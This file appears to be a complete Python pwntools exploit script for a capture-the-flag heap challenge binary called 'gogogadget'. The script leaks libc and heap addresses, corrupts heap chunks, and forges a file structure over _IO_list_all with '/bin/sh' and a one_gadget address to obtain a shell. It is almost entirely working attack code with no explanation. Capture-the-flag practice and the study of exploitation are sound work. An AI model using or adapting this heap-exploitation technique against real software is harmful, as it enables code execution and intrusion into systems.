#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *

local = 1
link = ''
host,port = map(str.strip, link.split(':')) if link != '' else ("",0)
context.log_level = 'debug'
#context.terminal = "/home/noone/hyperpwn/hyperpwn-client.sh"
context.terminal =  ['mate-terminal','--geometry=94x60--10-26','--hide-menubar', '-x','sh','-c',]
exe = './gogogadget'
context.binary = exe
elf = ELF(exe)
libc = elf.libc


#don't forget to change it
if local:
    io = process(exe)
else:
    io = remote(host,port)

s    = lambda data                                    : io.send(str(data))
sa   = lambda delim,data                              : io.sendafter(str(delim), str(data))
sl   = lambda data                                    : io.sendline(str(data))
sla  = lambda delim,data                              : io.sendlineafter(str(delim), str(data))
r    = lambda numb=4096                               : io.recv(numb)
rl   = lambda                                         : io.recvline().strip()
ru   = lambda delim,drop=True                         : io.recvuntil(delim, drop)
rg   = lambda regex                                   : io.recvregex(regex)
rp   = lambda timeout=1                               : io.recvrepeat(timeout)
uu32 = lambda data                                    : u32(data.ljust(4, '\x00'))
uu64 = lambda data                                    : u64(data.ljust(8, '\x00'))
lg   = lambda s,addr                                  : io.success('\033[1;31;40m%20s--> 0x%x\033[0m'%(s,addr))
ga   = lambda job=""                                  : gdb.attach(io, job) if local else 0
ia   = lambda                                         : io.interactive()

# break on aim addr
def debug(addr,PIE=True):
    if PIE:
        text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(io.pid)).readlines()[1], 16)
        gdb.attach(io,'b *{}'.format(hex(text_base+addr)))
    else:
        gdb.attach(io,"b *{}".format(hex(addr)))

# get_one_gadget
def get_one_gadget(filename):
    try:
        import subprocess
    except Exception as e:
        print("subprocess not install")
        exit(0)
    return map(int, subprocess.check_output(['one_gadget', '--raw', filename]).split(' '))



#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

def choice(idx):
    def wrap(f):
        def go(*args, **kargs):
            sla(": ", idx)
            f(*args, **kargs)
        return go
    return wrap

@choice(idx=1)
def new(content):
    sla(" :", content)

@choice(idx=2)
def delete(idx):
    sla(" :", idx)

@choice(idx=3)
def show(idx):
    sla(" :", idx)

@choice(idx=4)
def Activate(speed, destination):
    sla(" :", speed)
    sa(" :", destination)

@choice(idx=5)
def Deactivate():
    pass

@choice(idx=6)
def GogoCopter():
    pass

def get_leak():
    GogoCopter()
    ru("A"*8)
    return uu64(r(6))

def exp(host, rce=False):
    if rce:
        one_gadget = get_one_gadget(libc.path)
    
    new("A") #0
    new("A") #1
    delete(0)
    Activate(10, "A"*8)
    libc.address = get_leak() - 0x3c4c18
    iolist = libc.address + 0x3c5520
    lg("libc", libc.address)
    Deactivate()
    delete(1)

    new("A")
    new("A")
    new("A")
    new("A")

    delete(0)
    delete(2)
    Activate(1337, "A"*8)
    heap = get_leak() - 0x160
    lg("heap", heap)

    Deactivate()
    delete(1)
    delete(3)

    new("A")
    new("A")
    new("A")
    new("A")
    new("A")
    
    delete(0)
    delete(1)
    delete(2)
    delete(3)

    new(p64(2) + p64(3) + p64(libc.address + one_gadget[0]) + "A"*(0xa8- 3*8))
    new("A"*0x10)
    Activate(0x1337, "A"*8)
    ga()
    delete(1)
    delete(4)

    new("A")
    new("A")
    new("A"*0x58 + p64(0x91))
    new("A"*0x38 + p64(0x31) + p64(heap) + p64(0x31) + p64(0) + p64(0x31)*4 + p64(heap + 8))

    delete(3)
    delete(1)

    new("A"*0x50 + "/bin/sh\x00" + p64(0x61) + '123'.ljust(8, '\x00') + p64(iolist - 0x10) + p64(2) + p64(3))
    sl("1")

    '''                         
    try:
        from LibcSearcher import *
    except Exception as e:
        print("LibcSearcher not install")
        exit(0)        
    obj = LibcSearcher("fgets",leak_addr)
    libc_base = leak_addr - obj.dump("fgets")  
    system_addr = libc_base + obj.dump("system")
    malloc_hook = libc_base + obj.dump("__malloc_hook")
    free_hook = libc_base + obj.dump("__free_hook")
    bin_sh_addr = libc_base + obj.dump("str_bin_sh")
    '''
    ia()

if __name__ == '__main__':
    exp(host,True)

